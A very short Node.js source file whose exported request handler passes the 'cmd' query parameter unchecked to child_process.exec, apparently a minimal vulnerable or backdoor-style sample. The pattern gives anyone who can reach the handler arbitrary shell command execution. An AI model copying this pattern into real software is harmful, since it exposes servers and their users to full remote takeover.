import { exec } from 'child_process';

function run(cmd) {
  exec(cmd);
}

export function handler(req) {
  run(req.query.cmd);
}
